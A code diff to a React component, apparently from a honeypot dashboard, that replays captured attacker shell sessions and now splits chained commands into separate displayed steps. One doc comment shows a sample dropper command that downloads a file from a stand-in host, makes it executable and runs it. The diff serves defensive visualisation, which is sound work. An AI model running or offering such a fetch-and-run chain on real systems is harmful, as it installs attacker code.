@@ -60,9 +60,45 @@ const gapFor = (ms) => Math.min(Math.max(Math.sqrt(Math.max(ms, 0)) * 14, 260), 
 
 // Droppers often push a whole binary through `echo` as one base64 line. Left
 // whole, a single command filled the transcript and the rest of the
-// session scrolled out of sight. Long commands show their opening, which is
+// session scrolled out of sight. Long steps show their opening, which is
 // where the intent is, and say how much was left out. The full text is on hover.
-const MAX_COMMAND_CHARS = 180;
+const MAX_COMMAND_CHARS = 160;
+
+/**
+ * "cd /tmp; wget http://x/a; chmod +x a; ./a" -> its four steps.
+ *
+ * Attacks here usually arrive as one line of a dozen steps. Clamped as a
+ * whole, the replay showed the first step and "+700 characters", which hid
+ * the fetch and the run, the part worth watching. Splits on ; and newlines
+ * outside quotes, so a key or a string with a semicolon in it stays whole.
+ */
+function splitSteps(command) {
+  const steps = [];
+  let current = "";
+  let quote = null;
+  for (let i = 0; i < command.length; i++) {
+    const ch = command[i];
+    if (quote) {
+      if (ch === "\\" && quote === '"') {
+        current += ch + (command[i + 1] ?? "");
+        i++;
+        continue;
+      }
+      if (ch === quote) quote = null;
+      current += ch;
+    } else if (ch === "'" || ch === '"') {
+      quote = ch;
+      current += ch;
+    } else if (ch === ";" || ch === "\n") {
+      if (current.trim()) steps.push(current.trim());
+      current = "";
+    } else {
+      current += ch;
+    }
+  }
+  if (current.trim()) steps.push(current.trim());
+  return steps.length ? steps : [command];
+}
 
 const relativeTime = (ms) => {
   if (!Number.isFinite(ms) || ms < 0) return "+0.0s";
@@ -99,26 +135,29 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
     });
 
     const t0 = new Date(events[0].timestamp).getTime();
-    return events.map((ev, i) => {
+    return events.flatMap((ev, i) => {
       const at = new Date(ev.timestamp).getTime();
       const prev = i === 0 ? at : new Date(events[i - 1].timestamp).getTime();
       const kind = ev.command ? "command" : ev.username ? "login" : "connect";
-      const full =
+      const pieces =
         kind === "command"
-          ? ev.command
-          : kind === "login"
-            ? `${ev.username} / ${ev.password ?? ""}`
-            : "connection opened";
-      const clamp = kind === "command" && full.length > MAX_COMMAND_CHARS;
-      return {
-        kind,
-        offset: at - t0,
-        gap: at - prev,
-        tags: ev.tags || [],
-        full,
-        text: clamp ? full.slice(0, MAX_COMMAND_CHARS) : full,
-        omitted: clamp ? full.length - MAX_COMMAND_CHARS : 0,
-      };
+          ? splitSteps(ev.command)
+          : [kind === "login" ? `${ev.username} / ${ev.password ?? ""}` : "connection opened"];
+      // One line per step. The first carries the event's timing and its
+      // techniques; the rest follow it as continuations.
+      return pieces.map((full, j) => {
+        const clamp = kind === "command" && full.length > MAX_COMMAND_CHARS;
+        return {
+          kind,
+          continuation: j > 0,
+          offset: at - t0,
+          gap: at - prev,
+          tags: j === 0 ? ev.tags || [] : [],
+          full,
+          text: clamp ? full.slice(0, MAX_COMMAND_CHARS) : full,
+          omitted: clamp ? full.length - MAX_COMMAND_CHARS : 0,
+        };
+      });
     });
   }, [data]);
 
@@ -163,7 +202,7 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
         setStep((s) => s + 1);
         setTyped(0);
       },
-      step === 0 ? 400 : gapFor(line.gap)
+      step === 0 ? 400 : line.continuation ? 140 : gapFor(line.gap)
     );
     return () => clearTimeout(id);
   }, [playing, step, typed, lines]);
@@ -192,7 +231,7 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
 
   const visible = lines.slice(0, Math.min(step + 1, lines.length));
   const done = step >= lines.length;
-  const commandCount = lines.filter((l) => l.kind === "command").length;
+  const commandCount = lines.filter((l) => l.kind === "command" && !l.continuation).length;
   const techniques = [...new Set(lines.flatMap((l) => l.tags))];
   // Techniques already revealed at this point in the replay.
   const seen = new Set(visible.flatMap((l, i) => (i < step ? l.tags : typed > 0 ? l.tags : [])));
@@ -214,7 +253,7 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
           <p className="mt-1.5 flex items-center gap-2 min-w-0 text-sm">
             <span aria-hidden="true">{countryFlag(session.country_iso)}</span>
             <span className="font-mono text-info">{session.src_ip}</span>
-            <span className="text-xs text-fg-subtle">busiest session this week</span>
+            <span className="text-xs text-fg-subtle">an attack from the past week</span>
           </p>
           <p className="mt-0.5 text-sm text-fg-muted truncate">
             {networkLabel(session)}
@@ -293,7 +332,7 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
           return (
             <div key={i} className="flex gap-3">
               <span className="text-fg-subtle/70 tabular-nums shrink-0 hidden sm:inline w-14 text-right">
-                {relativeTime(line.offset)}
+                {line.continuation ? "" : relativeTime(line.offset)}
               </span>
               <span className="min-w-0 break-all">
                 {line.kind === "connect" && <span className="text-fg-subtle">{shown}</span>}
@@ -305,7 +344,9 @@ const FeaturedAttack = ({ data, loading, error, mitreById, onOpenFull, className
                 )}
                 {line.kind === "command" && (
                   <>
-                    <span className="text-accent">$ </span>
+                    <span className={line.continuation ? "text-fg-subtle/60" : "text-accent"}>
+                      {line.continuation ? "  " : "$ "}
+                    </span>
                     <span className="text-fg" title={line.omitted ? line.full : undefined}>
                       {shown}
                     </span>
